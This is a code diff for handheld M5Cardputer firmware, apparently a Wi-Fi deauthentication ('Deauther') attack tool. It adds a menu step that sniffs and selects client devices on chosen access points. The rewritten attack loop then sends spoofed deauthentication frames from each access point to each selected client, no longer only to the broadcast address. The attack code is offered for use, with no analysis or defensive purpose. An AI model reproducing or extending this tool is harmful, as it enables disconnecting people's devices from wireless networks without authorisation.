@@ -16,7 +16,7 @@ void trollDeauth(const uint8_t *client_addr, const uint8_t *ap_addr) {
     uint8_t source_addr[6];
     generate_random_mac(source_addr);
 
-    send_deauth(source_addr,client_addr,ap_addr);
+    send_deauth(client_addr,ap_addr,ap_addr);
 }
 
 int Deauther() {
@@ -25,7 +25,7 @@ int Deauther() {
     int Selector = 0;
     struct menu Menu;
 
-    Menu.name = "~/WiFi/Deauther";
+    Menu.name = "~/WiFi/Dthr";
     Menu.length = 3;  // Select Ap, clientmac, statack
     Menu.elements = new item[Menu.length];
 
@@ -36,13 +36,12 @@ int Deauther() {
         Menu.elements[0].options[i] = NULL;
     }
 
-    strcpy(Menu.elements[1].name, "Client mac");
-    Menu.elements[1].type = 0;
-    Menu.elements[1].length = 2;
-    Menu.elements[1].selector = 0;
-    Menu.elements[1].options[0] = "ff..";
-    Menu.elements[1].options[1] = "ff..";
-    Menu.elements[1].options[2] = NULL;
+    strcpy(Menu.elements[1].name, "Select Client");
+    Menu.elements[1].type = 1;
+    Menu.elements[1].length = 0;
+    for (int i = 0; i < MAX_OPTIONS; i++) {
+        Menu.elements[1].options[i] = NULL;
+    }
 
     strcpy(Menu.elements[2].name, "Start attack");
     Menu.elements[2].type = 1;
@@ -55,7 +54,9 @@ int Deauther() {
 
     int UPp, DOWNp, LEFTp, RIGHTp, SELECTp, RETURNp;
     int aps_count = 0;
+    int clients_count = 0;
     AP* aps = NULL;
+    mac_addr_t* clients = NULL;
 
 
     while (1) {
@@ -110,13 +111,38 @@ int Deauther() {
 
                         break;
                     case 1:
+                        char buffer[100]; // Assume this is large enough to hold your final string.
+                        sprintf(buffer, "Sniffing clients...\nFor %d selected APs\nDuring 10s", aps_count);
+                        printf("%s\n", buffer); // Print the string to verify
+
+                        M5GFX_display_text(0, 0, buffer, TFT_WHITE);
+
+                        clients = select_client_menu(&clients_count, aps, aps_count);
+                        M5GFX_display_text(0, 0, "", TFT_WHITE);
+                        M5GFX_clear_screen();
+
+                        // for (int i = 0; i < clients_count; i ++) {
+                        //     printf ("%d: %02x:%02x:%02x:%02x:%02x:%02x\n", i, clients[i][0],clients[i][1],clients[i][2],clients[i][3],clients[i][4],clients[i][5]);
+                        // }
+
+                        if (!clients) {
+                            printf("No access points Selected.\n");
+                            return -1;
+                        }
+
                         break;
                     case 2:  // Start attack
+                        if (!aps||!clients) {
+                            LogError("AP or Client is NULL");
+                            break;
+                        }
+
                         init_pps_timer();
                         vTaskDelay(pdMS_TO_TICKS(100));
                         M5Cardputer.update();
 
                         stop_wifi();
+                        vTaskDelay(pdMS_TO_TICKS(100)); 
                         start_wifi(WIFI_MODE_AP, true);
 
                         int wait = 1;
@@ -125,13 +151,13 @@ int Deauther() {
                             if (M5Cardputer.Keyboard.isPressed()) {
                                 wait = 0;
                             }
-                            packet_count++;
 
-                            uint8_t client[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-
-                            for (int i = 0; i < aps_count; i ++) {
-                                trollDeauth(client, aps[i].address);
-                                vTaskDelay(pdMS_TO_TICKS(100));
+                            for (int i = 0; i < aps_count; i++) {
+                                for (int j = 0; j < clients_count; j++) {
+                                    trollDeauth(clients[j].mac , aps[i].address);                                            
+                                    packet_count++;
+                                    vTaskDelay(pdMS_TO_TICKS(100));
+                                }
                             }
                         }
                         stop_pps_timer();
